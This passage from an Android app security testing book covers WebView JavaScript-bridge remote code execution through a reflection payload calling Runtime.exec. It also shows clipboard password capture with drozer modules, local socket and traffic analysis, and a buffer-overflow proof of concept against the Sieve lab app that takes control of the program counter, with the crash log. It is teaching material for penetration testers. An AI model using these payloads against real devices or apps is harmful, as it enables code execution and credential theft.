of any operating system command:
window.jsvar.getClass().forName('java.lang.Runtime').getMethod(
'getRuntime',null).invoke(null,null).exec(cmd);
This code essentially performs a Runtime.getRuntime().exec(). The cmd in this case would have to be of
the format ['/system/bin/sh','-c','os_ command'] and allows os_command to be any command or chain
of commands being piped together or redirected. Chapter 8 presents more in-depth exploration of the
exploitation of this vulnerability.
This issue is present on all API versions prior to 17 (which equates to Android 4.1). This also means that
any application that has been compiled with an android:targetSdkVersion attribute in the 
element of less than 17 will also be vulnerable, regardless of the device it is running on.
API versions 17 and higher have a fix implemented. Any method that the developer wants to be exposed to
the bridge should be explicitly marked with the @JavascriptInterface annotation. The minimalistic
example shown earlier that had a method named hello() had this annotation present. Without this
annotation present, later versions of Android would not allow the hello() method to be accessed from
JavaScript.
When testing an application for this vulnerability, you can do a manual inspection to look for the cases
previously discussed. You can also install a drozer module for this purpose:
dz> module install javascript
Processing jubax.javascript... Done.
Successfully installed 1 modules, 0 already installed.
This installs a new module under scanner.misc.checkjavascriptbridge. You can use it to perform some
basic checks on the DEX file for keywords that indicate a JavaScriptInterface is in use and, according to
how the application has been configured, whether it would be exploitable or not.
dz> run scanner.misc.checkjavascriptbridge -a com.vulnerable.js
Package: com.vulnerable.js
- vulnerable to WebView.addJavascriptInterface + targetSdkVersion=15
- not vulnerable to org.chromium.content.browser.addPossiblyUnsafeJava
scriptInterface
Neil Bergman disclosed this issue publicly at http://50.56.33.56/blog/?p=314 in December 2012.
However, the exploitation of this issue only became common knowledge late in 2013, when David Hartley
from MWR InfoSecurity issued an advisory at
https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-
code-execution/ on abusing applications that make use of a JavaScriptInterface for loading
advertisements.
Other Communication Mechanisms
Applications could implement a plethora of techniques for communicating with other applications on the same
device or Internet servers. In general, you must assess the implementation of these techniques on a case-by-
case basis. This section provides some information about communication mechanisms that the author has
discovered while assessing applications.
Clipboard
The Android clipboard works in a similar way to clipboards on a desktop operating system. A global clipboard is
used by all applications on a device and this value can be read and altered by any application. In contradiction to
some other aspects of Android, no permission is required to read or write to the clipboard.
As such, any data that is placed on the clipboard can be read by any application. The ClipboardManager class
handles reads and writes to the clipboard (see
http://developer.android.com/reference/android/content/ClipboardManager.html). Beginning with Android
3.0 a method was added to the ClipboardManager that allows callback events to be registered when the “primary
clip” is changed.
It goes without saying that an attacker who has a malicious application installed on a device could register a
callback and read anything that is on the clipboard. This makes it completely insecure as a means of
communicating between applications because the data on the clipboard can be considered publicly accessible by
all applications.
A malicious application that is reading from the clipboard may find it especially fruitful when the user of the
device is making use of a password manager. This is because whenever the user copies a password into the
clipboard it would cause an event on the malicious application that retrieves the value. The Sieve application
allows its users to copy passwords to the clipboard by clicking on one of the stored user accounts in the list. One
of drozer’s post-exploitation modules allows a user to read the clipboard. You install it by running module
install clipboard. After clicking on a service in the list in Sieve and then running the newly installed module,
you see the user’s password:
dz> run post.capture.clipboard
[*] Clipboard value: password123
Setting the clipboard content from any application is also possible, as demonstrated in drozer:
dz> run post.perform.setclipboard mahh123
[*] Clipboard value set: mahh123
dz> run post.capture.clipboard
[*] Clipboard value: mahh123
When assessing an application that makes use of the clipboard for any reason, consider the attacks previously
discussed to see whether the potential for abuse exists. It would be especially interesting if an application is
reading values from the clipboard that is used inside the code. Tracing this path in the source code may lead to
the discovery of other vulnerabilities that are exposed because of this entry point of untrusted user input.
Local Sockets
Applications may use sockets (whether they are TCP, UDP, or UNIX) to share information between applications
or components of the same application. The problem with this approach is that it provides much less structure
for security than the APIs that the Android OS provides. For instance, look at an example where an application
opens a TCP socket on port 5555 and binds it to 127.0.0.1. This looks as follows when you perform a netstat:
$ adb shell netstat -antp
Proto Recv-Q Send-Q Local Address Foreign Address State
...
tcp 0 0 127.0.0.1:5555 0.0.0.0:* LISTEN
...
Even though other computers on the network cannot reach this port, applications on the same device can. This
method in itself does not provide any form of authentication because any application can initiate a connection
with this listener.
TCP/UDP Protocols with Other Hosts
An Android application can be designed to communicate with other hosts using a number of protocols. Proxying
an application through a tool like Burp can only help uncover and test web traffic. Identifying which protocol is
in use by an application can be tricky and you often must perform manual inspection of the code. Another way is
to observe which host is being communicated with by using tcpdump on a rooted device or emulator. Starting
tcpdump and then opening the target application creates a packet dump. You can then inspect the packet dump
using Wireshark (see http://www.wireshark.org/) to discover the protocol and host being communicated with.
You can obtain the compiled tcpdump binary from any Android emulator at /system/xbin/tcpdump or compile the
source from http://www.tcpdump.org/. Running tcpdump and writing the output to a file looks as follows:
root@generic:/ # tcpdump -w /data/local/tmp/dump.cap
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 96
bytes
^C260 packets captured
261 packets received by filter
0 packets dropped by kernel
However, when you pull this file from the emulator and open it in Wireshark, the error shown in Figure 7.13
appears.
Figure 7.13 An error in Wireshark when you try to open the generated capture file
This happened because all packets are truncated by default to 96 bytes by tcpdump because this keeps the output
file small. To see entire packets and their contents you would need to instruct tcpdump to use the maximum
available size, which is 65,535 bytes. To do so, add a -s 0 to the tcpdump command. Following is the command to
ensure a full packet capture:
root@generic:/ # tcpdump -s 0 -w /data/local/tmp/dump.cap
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size
65535 bytes
^C14 packets captured
15 packets received by filter
0 packets dropped by kernel
A nice trick to be able to see live packet captures on an Android device in real time is to use network redirection
techniques to pipe the output of tcpdump directly into Wireshark. To do this on an emulator, follow these steps:
1. Start tcpdump and forward output to a listening port.
$ adb shell "tcpdump -s 0 -w - | nc -l -p 4444"
2. Forward the port using ADB.
$ adb forward tcp:4444 tcp:4444
3. Connect to the port and pipe the output to Wireshark.
$ nc localhost 4444 | sudo wireshark -k -S -i -
After you have identified the traffic being sent and received by your application, you will be in a better position
to locate the relevant source. Indicators like the port in use by the communications, the IP address, or DNS
name would all be good starting points for searching through the source code and finding the supporting code.
After discovering the relevant classes that are making the connections, you can assess them. Some applications
may implement custom TCP protocols that you would need to manipulate. You can use tools like Canape (see
http://www.contextis.com/services/research/canape/) and Mallory (see
https://intrepidusgroup.com/insight/mallory/) to intercept and modify TCP or UDP traffic for custom
protocols. This does not mean that these tools are automatic; and they are often tricky to get running correctly.
You still need a solid understanding of the code in order to build a proper testing environment using these tools.
A technique you can use on a device or emulator to trick it to connecting to a transparent proxy provided by
these tools is to add a DNS entry that is used by the application. If an application is connecting to a TCP port on
an Internet-facing server and it is using DNS to resolve the IP address, then you may be in luck. By editing the
HOSTS file found at /system/etc/hosts, you can trick the application into connecting to your transparent proxy
by setting the DNS name that is queried by the application to your computer’s IP address.
Exploiting Other Vectors
This section presents the exploitation of native C/C++ code within Android applications as well as package
misconfigurations that can lead to the compromise of an application.
Abusing Native Code
Android applications can include native code that is written in C/C++ and make use of the Java Native Interface
(JNI) to interact with these libraries from Java. It is no secret that native code can contain many problems and
is difficult to secure. This means that any input into native code on Android introduces the potential for an
attacker to exploit a vulnerability and take control of the process to execute arbitrary code.
Finding Native Code
Native code could be used at any point in an application and so you would have to discover calls to native
functions inside the application code. Strings that you can search inside decompiled code that would indicate the
declaration or use of a native library are System.loadLibrary, System.load or the native keyword. The library
being specified by System.loadLibrary needs to be included inside the APK under the /lib folder. A library
loaded by System.load can be anywhere on the filesystem, as long as it is accessible and executable by the
application.
To find out what a native library is doing without having the application’s source code, you would have to
reverse engineer the library using a tool like IDA (see https://www.hex-rays.com/products/ida/). You should
audit these libraries for common vulnerabilities found in C/C++ applications. Multiple publications and many
other resources are available on finding vulnerabilities that allow for the execution of arbitrary code. Therefore,
this chapter does not delve into any of these issues. Applications could also contain third-party libraries, such as
OpenSSL. During the timespan available in a normal assessment of an application, trying to find new
vulnerabilities in a large third-party library would likely not be feasible. Instead, find the version of the library in
use by searching for indicators in IDA, or using another known way to find it that is unique to the library.
Finding the version in use and searching on the Internet could lead to the discovery of already-disclosed
vulnerabilities for that version. Vulnerabilities in these components could perhaps be used as an attack path
into the application.
The Sieve application contains two custom libraries that are used for the encryption and decryption of
passwords stored in the password manager. The names of these libraries are libencrypt.so and libdecrypt.so. You
can see these libraries being loaded inside CryptoService.java and their available functions defined:
static
{
System.loadLibrary("encrypt");
System.loadLibrary("decrypt");
}
...
private native String runNDKdecrypt(String paramString,
byte[] paramArrayOfByte);
private native byte[] runNDKencrypt(String paramString1,
String paramString2);
Tracing these functions back to where they are used inside the Sieve application reveals a path into this code
that accepts user input. Particularly, it is used by the exposed CryptoService service. This means that
parameters that can be passed directly into this code have the potential to exploit vulnerabilities in the native
code.
The only aspect missing to make this a complete attack vector is a vulnerability in one of these native functions.
Let us examine libencrypt.so and attempt to find exploitable vulnerabilities. Figure 7.14 shows loading this file
into IDA (even the free version supports ARM).
Figure 7.14 Loading libencrypt.so into IDA
Looking for the runNDKencrypt function reveals that it has been named
Java_com_mwr_example_sieve_CryptoService_runNDKencrypt in IDA. Click this function and press the spacebar
key to put IDA into graph mode, which may be easier for visualizing the flow of the code. Careful inspection
reveals a vulnerable memcpy implementation in the code. Finding the exact disassembly that shows this
vulnerability will be left as an exercise for you. Instead we translate this back to C++ code and examine it
further from there:
const char* key_userinput = (*env)->GetStringUTFChars(env, jkey, 0);
int key_len = strlen(key_userinput);
uint32_t key[4];
memcpy(key, key_userinput, sizeof(char) * key_len);
The vulnerability in the previous code is that user input is used inside the memcpy operation, and the length of
the user input is used to determine how many bytes to copy into the key variable. If the user provides a key
length of anything more than 4, a buffer overflow occurs. The vulnerable code can be reached by interacting
with the exported CryptoService examined earlier in this chapter. You can see a proof of concept that triggers
this vulnerability by sending an overly long com.mwr.example.sieve.KEY extra to the CryptoService:
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve
.CryptoService --msg 3452 2 3 --extra string com.mwr.example.sieve.KEY
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzAAAAzzzz
--extra string com.mwr.example.sieve.STRING "string to be encrypted"
--bundle-as-obj
Did not receive a reply from
com.mwr.example.sieve/com.mwr.example.sieve.CryptoService.
Viewing what happens in logcat reveals the following:
F/libc ( 5196): Fatal signal 11 (SIGSEGV) at 0x41414141 (code=1),
thread 5209 (m_CryptoService)
I/DEBUG ( 49): *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG ( 49): Build fingerprint: 'generic/sdk/generic:4.4.2/KK/9380
07:eng/test-keys'
I/DEBUG ( 49): Revision: '0'
I/DEBUG ( 49): pid: 5196, tid: 5209, name: m_CryptoService >>>
com.mwr.example.sieve:remote <<<
I/DEBUG ( 49): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr
41414141
I/DEBUG ( 49): r0 b807bb68 r1 a8db7a0e r2 ffffffee r3
41414141
I/DEBUG ( 49): r4 b5b09e01 r5 00000004 r6 00000000 r7
a8db7a30
I/DEBUG ( 49): r8 a8db7a28 r9 abb9ded0 sl b807b158 fp
a8db7adc
I/DEBUG ( 49): ip 80000000 sp a8db79e0 lr a8e41f07 pc
a8e41f08 cpsr 60000030
I/DEBUG ( 49): d0 3f80000040000000 d1 3f50624d40000000
I/DEBUG ( 49): d2 7e37e43c8800759c d3 7e37e43c8800759c
I/DEBUG ( 49): d4 8000000000000000 d5 3f40000042810000
I/DEBUG ( 49): d6 3fc999999999999a d7 3f80000000000000
I/DEBUG ( 49): d8 0000000000000000 d9 0000000000000000
I/DEBUG ( 49): d10 0000000000000000 d11 0000000000000000
I/DEBUG ( 49): d12 0000000000000000 d13 0000000000000000
I/DEBUG ( 49): d14 0000000000000000 d15 0000000000000000
I/DEBUG ( 49): scr 60000010
I/DEBUG ( 49):
I/DEBUG ( 49): backtrace:
I/DEBUG ( 49): #00 pc 00000f08 /data/app-lib/com.mwr.example
.sieve-1/libencrypt.so (Java_com_mwr_example_sieve_CryptoService_
runNDKencrypt+531)
...
I/DEBUG ( 49): a8db7a0c d8dc5d7b
I/DEBUG ( 49): a8db7a10 b5b09e01 /system/lib/libdvm.so
I/DEBUG ( 49): a8db7a14 b807b148 [heap]
I/DEBUG ( 49): a8db7a18 7a7a7a7a
I/DEBUG ( 49): a8db7a1c 7a7a7a7a
I/DEBUG ( 49): ........ ........
I/DEBUG ( 49): #01 a8db7ac8 abb9decc
I/DEBUG ( 49): a8db7acc 00000001
...
I/DEBUG ( 49): memory near r0:
I/DEBUG ( 49): b807bb48 00000000 00000000 00000000 00000000
I/DEBUG ( 49): b807bb58 00000000 00000000 00000000 0000003b
I/DEBUG ( 49): b807bb68 a0c58026 3dd0d7d5 a8c9c62c 1c7c59bb
I/DEBUG ( 49): b807bb78 c7920389 0021b22f fbb2801a 4884621f
I/DEBUG ( 49): b807bb88 c54c3f0a 6c005d7b 00000065 00000000
I/DEBUG ( 49): b807bb98 00000038 0000003b 00000000 00000000
I/DEBUG ( 49): b807bba8 00000000 00000000 00000000 00000000
I/DEBUG ( 49): b807bbb8 00000000 00000000 00000000 00010001
I/DEBUG ( 49): b807bbc8 00000000 0000001a 646e614c 00000073
I/DEBUG ( 49): b807bbd8 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a
I/DEBUG ( 49): b807bbe8 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a
I/DEBUG ( 49): b807bbf8 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a
I/DEBUG ( 49): b807bc08 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a
I/DEBUG ( 49): b807bc18 7a7a7a7a 7a7a7a7a 7a7a7a7a 7a7a7a7a
I/DEBUG ( 49): b807bc28 7a7a7a7a 7a7a7a7a 7a7a7a7a 41414141
I/DEBUG ( 49): b807bc38 7a7a7a7a 00650000 0073002f 00000023
...
I/DEBUG ( 49): memory near sp:
I/DEBUG ( 49): a8db79c0 a8db7a30 a8db7a28 abb9ded0 b807b158
I/DEBUG ( 49): a8db79d0 a8db7adc b807bb68 b5b09e01 a8e41f07
I/DEBUG ( 49): a8db79e0 a8db7adc b5b09e7d a0c58026 3dd0d7d5
I/DEBUG ( 49): a8db79f0 a8c9c62c 1c7c59bb c7920389 0021b22f